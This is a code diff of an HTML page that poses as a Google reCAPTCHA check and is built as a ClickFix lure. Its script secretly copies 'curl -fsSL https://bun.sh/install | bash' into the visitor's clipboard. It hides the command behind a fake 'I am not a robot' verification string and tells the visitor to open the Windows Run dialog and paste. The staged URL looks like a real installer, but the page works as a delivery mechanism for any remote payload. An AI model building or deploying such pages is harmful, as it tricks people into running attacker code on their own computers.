@@ -1,12 +1,13 @@
 <!DOCTYPE html>
 
 <html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <title>reCAPTCHA Verification</title>
 
-        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
-        <style>
+<head>
+    <meta charset="utf-8">
+    <title>reCAPTCHA Verification</title>
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
+    <style>
         .container {
             font-family: Roboto, helvetica, arial, sans-serif;
         }
@@ -142,7 +143,7 @@
         ol {
             counter-reset: item;
             list-style-type: none;
-            list-style-position: outside;    
+            list-style-position: outside;
             padding-left: 0;
 
         }
@@ -221,24 +222,41 @@
             outline: none;
             cursor: not-allowed;
         }
-        </style>
-    </head>
-    <body>
 
-    <div class="container m-p">    
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0px;
+            padding: 0px;
+            overflow: hidden;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container m-p">
         <div id="checkbox-window-ab1937287" class="checkbox-window-ab1937287 m-p block">
             <div class="checkbox-container m-p">
                 <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
             </div>
             <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
-            <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="">
+            <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+                class="captcha-logo line-normal" alt="">
             <br>
             <p class="checkbox-desc m-p line-normal">
-            <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+                <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a
+                    href="https://www.google.com/intl/en/policies/terms/">Terms</a>
             </p>
             <img class="spinner" alt="" id="spinner">
         </div>
-        
+
         <div id="verify-window" class="verify-window">
             <div class="verify-container">
                 <header class="verify-header">
@@ -254,7 +272,7 @@
                         <li>
                             Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
                         </li>
-                        
+
                         <li>
                             In the verification window, press <b>Ctrl</b> + <b>V</b>.
                         </li>
@@ -266,21 +284,22 @@
                     <p>
                         You will observe and agree:
                         <br>
-                    <code>
+                        <code>
                         ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"
                     </code>
                     </p>
 
-                   
+
                 </main>
             </div>
             <footer class="verify-container verify-footer">
                 <div class="verify-footer-left">
                     Perform the steps above to finish verification.
                 </div>
-                <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
+                <button type="button" class="verify-verify-button block" id="verify-verify-button"
+                    disabled="true">Verify</button>
             </footer>
-        </div>        
+        </div>
     </div>
 
     <script>
@@ -307,12 +326,12 @@
 
         function runClickedCheckboxEffects() {
             hideCaptchaCheckbox();
-            setTimeout(function(){
+            setTimeout(function () {
                 showCaptchaLoading();
-            },500);
-            setTimeout(function(){
+            }, 500);
+            setTimeout(function () {
                 showVerifyWindow();
-            },900)
+            }, 900)
         }
 
         function showCaptchaLoading() {
@@ -324,7 +343,7 @@
         function hideCaptchaLoading() {
             checkboxBtnSpinner.style.opacity = "0";
             checkboxBtnSpinner.style.animation = "none";
-            setTimeout(function() {
+            setTimeout(function () {
                 checkboxBtnSpinner.style.visibility = "hidden";
             }, 500);
         }
@@ -362,8 +381,8 @@
             checkboxBtnSpinner.style.opacity = "0";
         }
 
-       function generateRandomNumber() {
-            const min = 1000; 
+        function generateRandomNumber() {
+            const min = 1000;
             const max = 9999;
             return Math.floor(Math.random() * (max - min + 1) + min).toString();
         }
@@ -382,7 +401,7 @@
             return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
         }
 
-        function setClipboardCopyData(textToCopy){
+        function setClipboardCopyData(textToCopy) {
             const tempTextArea = document.createElement("textarea");
             tempTextArea.value = textToCopy;
             document.body.append(tempTextArea);
@@ -391,7 +410,7 @@
             document.body.removeChild(tempTextArea);
         }
 
-        function stageClipboard(commandToRun, verification_id){
+        function stageClipboard(commandToRun, verification_id) {
             const suffix = " # "
             const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
             const end = "''"
@@ -406,25 +425,26 @@
             verifywindow.style.visibility = "visible";
             verifywindow.style.opacity = "1";
             verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
-            verifywindow.style.left =  checkboxWindow.offsetLeft + 54 + "px";
+            verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";
 
             if (verifywindow.offsetTop < 5) {
-               verifywindow.style.top = "5px";
+                verifywindow.style.top = "5px";
             }
 
-            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
-               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
+            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10) {
+                verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
             }
 
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
-            
+
             const commandToRun = `curl -fsSL https://bun.sh/install | bash`;
             stageClipboard(commandToRun, verification_id)
         }
 
         addCaptchaListeners();
 
-        </script>
-    </body>
+    </script>
+</body>
+
 </html>
